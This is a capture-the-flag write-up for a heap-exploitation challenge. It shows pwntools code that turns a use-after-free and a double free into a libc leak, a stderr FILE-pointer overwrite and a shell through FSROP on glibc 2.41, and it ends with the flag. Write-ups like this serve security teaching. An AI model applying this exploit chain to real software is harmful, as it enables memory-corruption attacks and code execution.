# Free the monsters
##### Challenge author: Lorenzinco

![Preview text](./writeup_media/prompt.png)

The challenge's structure is wrapped in a quest embarking game, the player is required to select some quest from the quest list change his equipment and embark, at any given moment during the preparation it can also check it's statistics.

Playing around with the binary already reveals some vulnerabilities:

```
What do you want to do?
1. Equip weapon
2. Unequip weapon
> 1
Enter weapon name: hammer
Enter weapon attack: 10
Enter weapon defense: 10
1. Check player status
2. Select a quest
3. Embark on a quest
4. Change equipment
5. Exit
> 4
Select equipment to change:
1. Helmet
2. Chest
3. Gloves
4. Waist
5. Legs
6. Weapon
7. Jewel
8. Earing
9. Charm
10. Talisman
11. Kinsect
12. Palico
13. Palamute
> 6
What do you want to do?
1. Equip weapon
2. Unequip weapon
> 2
1. Check player status
2. Select a quest
3. Embark on a quest
4. Change equipment
5. Exit
> 1
Name: Lorenzinco
Level: 1
Weapon: hammer

Attack: 24881791099
Defense: 10668836035454024818
====================================
1. Check player status
2. Select a quest
3. Embark on a quest
4. Change equipment
5. Exit
>
```

All of the pointers inside the player's profile do not get set to `NULL` when freed. Given the heap blocks structure, in which the next pointer gets stored in the data section of the current chunk [(click here to find more details about this)](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/), this gives already the ability to leak some heap addresses.

![Preview text](./writeup_media/free.png)

In the same part of the code we can also see that the code does not check whether that pointer was freed already before freeing it, this means we also got a **double free** to play around.

When allocating the chunks we also get to decide that to write in them, since the binary asks for the user to send the name, the attack and the defense of each equipment, conviniently stored inside the chunk.

Now, here comes the first problem: the chunk size. Each chunk is only `0x30` bytes wide. This means that if fill the tcache bins it fill fit right into the fast bin, not inside the unsorted one, which is where we want it to be.

To make a chunk fit into the unsorted bin we must therefore find a way to modify its size, this can be achieved by fast-bin duping, which is filling tcache, double freeing a chunk into a fastbin and change the next address to hit a chunk's metadata, by writing on it we're able to change the size of the chunk itself.

Keep in mind that due to the checks that get done when freeing, `prev_size` should be valid as well as `prev_inuse` flag which needs to be set to `1`.

The libc version is `2.41` therefore each heap pointer is encoded ( same for all libcs past 2.35 ).

```py
#FAKE AN UNSORTED BIN CHUNK TO LEAK LIBC
for i in range(1, 14):
    equip(i, p64(heap>>12)*4, heap>>12, 0)
for i in range(3, 10):
    unequip(i)
unequip(10)
unequip(11)
unequip(10)

for i in range(7):
    equip(3, b"A", 0, 0)
equip(3, b"A", (heap>>12)^(heap+0x2c0), 0)
for i in range(3):
    equip(3, p64(0)+p64(0x441), 0, 0)
for i in range(6):
    equip(3, b"B", 0, 0)

unequip(2)  
view()
r.recvuntil(b"Attack: ")
r.recvuntil(b"Attack: ")
libc.address = int(r.recvline()) - 0x211b20 # MAIN ARENA
log.info(hex(libc.address))
```

Having retrieved the libc base address now we can take two intended paths:

-   The angry FS-Rop cool as fuck road
-   The boring and lame environ and onegadget path

##### Note: The environ leak requires to be expecially carefull with the pointers inside the heap, when duping a chunk and modifying its next we might break the tcache, preventing us to from doing it again.

That said, i chose to writeup the cool as fuck road which involves writing a fake file pointer on the heap and then overwriting that pointer into `__std_err` (or whatever file pointer, stderr is handy since is not used in the context of this binary).

##### If you have no idea what this means i highly encourage you to read [this](https://blog.kylebot.net/2022/10/22/angry-FSROP/), it contains far more precise and usefull information about fs exploits that i could ever sum up in this writeup.

As said, we are going to overwrite `std_err`:

```py
#OVERWRITE STDERR->CHAIN
for i in range(1, 12):
    equip(i, p64(heap>>12)*4, 0, 0)

for i in range(3, 10):
    unequip(i)
unequip(10)
unequip(11)
unequip(10)

for i in range(7):
    equip(3, b"\0", 0,0)

equip(3, b"A", (heap>>12)^(libc.sym._IO_2_1_stderr_+0x60), 0)
for i in range(3):
    equip(3, p8(3), 0, heap+0x7a0) # heap pointer to our custom file struct

for i in range(7):
    equip(3, b"\0", 0,0)
```

and write a file struct containing the vtable pointer modified, pwntools has this fancy function to do this automatically called `fsrop()` so we don't have to go through the hassle of filling the vtable offsets ourself, it's like a one gadget.

```py
#WRITE FAKE FP ON THE HEAP
payload = fsrop(heap+0x7a0)+b"\0"*0x200
# redistribute payload among fields
for i in range(7):
    equip(3, payload[16:16+0x20], u64(payload[:8]), u64(payload[8:16]))
    payload = payload[16+0x30:]
```

Note: this payload gets truncated each time a chunk metadata appears on the heap, so some fields of the file struct are goin to be broken and filled with garbage. They are not essential at all so we want to start writing the struct from an offset from which the important part (vtable pointer) is not overwritten with garbage, that is `0x10`.

![Preview text](./writeup_media/gdb_fs.png)

Done! All there's left to do is to trigger `_IO_flush_all` by exiting the binary and we popped a shell!

`TRX{wh0_th3_fuck_kn0w5_4b0u7_f457B1n5?!_153CA0}`